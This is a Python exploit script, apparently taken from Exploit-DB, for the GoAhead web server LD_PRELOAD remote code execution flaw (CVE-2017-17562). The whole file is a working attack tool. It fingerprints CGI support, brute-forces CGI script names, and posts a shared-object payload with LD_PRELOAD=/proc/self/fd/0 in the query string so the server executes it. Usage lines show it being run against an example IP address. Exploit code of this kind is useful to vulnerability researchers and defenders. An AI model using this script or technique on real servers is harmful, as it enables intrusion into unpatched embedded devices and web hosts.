#!/usr/bin/python

# GoAhead httpd/2.5 to 3.6.5 LD_PRELOAD remote code execution exploit

# EDB Note: Payloads ~ https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/43360.zip
# EDB Note: Source ~ https://www.elttam.com.au/blog/goahead/
# EDB Note: Source ~ https://github.com/elttam/advisories/blob/c778394dfe454083ebdfb52f660fd3414ee8adb8/CVE-2017-17562/

#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++++++++:--/++++++++++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++++/:-......-:/++++++++++++++++++++++++++++++++
#++++++++++++++++++++++/////::-..............-:://///+++++++++++++++++++++++
#++++++++++++++++++++++..............-:..............+++++++++++++++++++++++
#++++++++++++++++++++++..........-://+++/:-..........+++++++++++++++++++++++
#++++++++++++++++++++++......://++++++++++++//::.....+++++++++++++++++++++++
#++++++++++++++++++++++......++++++++++++++++++/.....+++++++++++++++++++++++
#++++++++++++++++++++++......:/+++++++++++++++/-.....+++++++++++++++++++++++
#++++++++++++++++++++++.........--::////:::--........+++++++++++++++++++++++
#++++++++++++++++++++++-...........................:/+++++++++++++++++++++++
#++++++++++++++++++++++:.....-................--:/++++++++++++++++++++++++++
#+++++++++++++++++++++++-....-+///::::::::///+++++++++++++++++++++++++++++++
#+++++++++++++++++++++++/.....-/++++++++++++++++/::+++++++++++++++++++++++++
#++++++++++++++++++++++++/-.....-/++++++++/:--...-/+++++++++++++++++++++++++
#++++++++++++++++++++++++++:.......:/++/:.......:+++++++++++++++++++++++++++
#+++++++++++++++++++++++++++/-................-/++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++/:-..........-:/++++++++++++++++++++++++++++++
#++++++++++++++++++++++++++++++++/:--..--:/+++++++++++++++++++++++++++++++++
#++++++++++++++++++++++++++++++++++++++++++++++++(c) 2017 elttam Pty Ltd.+++

# ~/goahead_exploit>>> ./makemyday.py -h
# usage: makemyday.py [-h] [--server SERVER] [--port PORT] [--maxconn {1-256}]
#                    [--verbose]
#                    {fingerprint,stage,exploit,findcgi} ...
#
# GoAhead httpd remote LD_PRELOAD exploit.
#
# positional arguments:
#   {fingerprint,stage,exploit,findcgi}
#     fingerprint         fingerprint if GoAhead server uses CGI
#     stage               send a staging payload and wait indefinitely
#     exploit             run exploit
#     findcgi             brute force cgi script names
#
# optional arguments:
#   -h, --help            show this help message and exit
#   --server SERVER       target ip or hostname, default is localhost
#   --port PORT           target port, default is 80
#   --maxconn {1-256}     max concurrent requests, default is 1
#   --verbose, -v         increase verbosity level
#
# See https://www.elttam.com.au for more information.

# >>>./makemyday.py --server 192.168.1.24 --port 80 exploit --payload ./payloads/X86_64-hw.so
# exploit works!

import argparse
import httplib
import sys
import threading
from string import Template

class GoAheadExploit(object):
    '''GoAheadExploit'''
    qid = None
    payload = None
    exploited = False

    def __init__(self):
        '''Configure arguments and run the exploit'''
        parser = argparse.ArgumentParser(
            description="GoAhead httpd remote LD_PRELOAD exploit.",
            epilog="See https://www.elttam.com.au for more information."
            )

        parser.add_argument('--server', default="localhost",
                            help='target ip or hostname, default is localhost')
        parser.add_argument('--port', type=int, default=80,
                            help='target port, defaults is 80')
        parser.add_argument('--maxconn', type=int, default=1, choices=xrange(1, 256),
                            metavar="{1-256}", help='max concurrent requests, default is 1')
        parser.add_argument('--verbose', '-v', default=0, action='count',
                            help='increase verbosity level')

        common_options = argparse.ArgumentParser(add_help=False)
        common_options.add_argument('--cginame', default="cgitest",
                                    help='target cgi script')
        common_options.add_argument('--payload', nargs='?',
                                    type=argparse.FileType('r'), default=sys.stdin,
                                    help='shared object file to execute (defaults to stdin)')

        cmd_subparsers = parser.add_subparsers(dest="action")
        cmd_subparsers.add_parser(
            'fingerprint', help='fingerprint if GoAhead server uses CGI')
        cmd_subparsers.add_parser('stage', parents=[common_options],
                                  help='send a staging payload and wait indefinitely')
        cmd_subparsers.add_parser('exploit', parents=[common_options],
                                  help='run exploit')
        findcgi = cmd_subparsers.add_parser(
            'findcgi', help='brute force cgi script names')
        findcgi.add_argument('--wordlist', nargs='?',
                             type=argparse.FileType('r'), default=sys.stdin,
                             help='list of cgi filenames to brute force (defaults to stdin)')

        # parse command line and call into action
        self.args = parser.parse_args()
        getattr(self, self.args.action)()

    def fingerprint(self):
        '''fingerprint'''
        conn = httplib.HTTPConnection(self.args.server, self.args.port)
        conn.connect()
        conn.request(
            "GET", "/cgi-bin/c8fed00eb2e87f1cee8e90ebbe870c190ac3848c")
        if conn.getresponse().read().find("CGI process file does not exist") != -1:
            print "CGI scripting is enabled"
        else:
            print "CGI scripting is disabled"
        conn.close()

    def findcgi(self):
        '''findcgi'''
        for cginame in self.args.wordlist.readlines():
            cginame = cginame[:-1]
            conn = httplib.HTTPConnection(self.args.server, self.args.port)
            conn.connect()
            conn.request("GET", "/cgi-bin/" + cginame)
            resp = conn.getresponse()
            if resp.status == 200:
                print "/cgi-bin/" + cginame + " exists."
            conn.close()

    def stage(self):
        '''stage'''
        payload = self.args.payload.read()
        headers = {"Host": self.args.server,
                   "User-Agent": "curl/7.51.0",
                   "Accept": "*/*",
                   "Content-Length": str(len(payload) + 1)}

        conn = httplib.HTTPConnection(self.args.server, self.args.port)
        conn.connect()
        conn.request("POST", "/cgi-bin/" + self.args.cginame, payload, headers)
        try:
            conn.getresponse()
        except httplib.BadStatusLine:
            pass
        conn.close()

    def exploit(self):
        '''exploit'''
        for _ in range(0, self.args.maxconn):
            tid = threading.Thread(self.do_exploit(verify,))
            tid.start()

    def do_exploit(self, verify_callback):
        '''do_exploit'''
        if not self.payload:
            self.payload = self.args.payload.read()
        contentlen = len(self.payload)

        headers = {"Host": self.args.server,
                   "User-Agent": "curl/7.51.0",
                   "Accept": "*/*",
                   "Content-Length": str(contentlen)}

        exploit_string = Template("/cgi-bin/${cginame}?LD_PRELOAD="
                                  "/proc/self/fd/0").substitute({
                                      "cginame": self.args.cginame
                                      })

        while not self.exploited:
            conn = httplib.HTTPConnection(self.args.server, self.args.port, timeout=10)
            conn.connect()
            conn.request("POST", exploit_string, self.payload, headers)
            try:
                if verify_callback(conn.getresponse()):
                    self.exploited = True
                    print "exploit works!"
            except httplib.BadStatusLine:
                pass
            conn.close()

# put your payload callback/verification code here
def verify(res):
    '''validation callback'''
    if res.getheader("hello"):
        return True
    return False

if __name__ == '__main__':
    GoAheadExploit()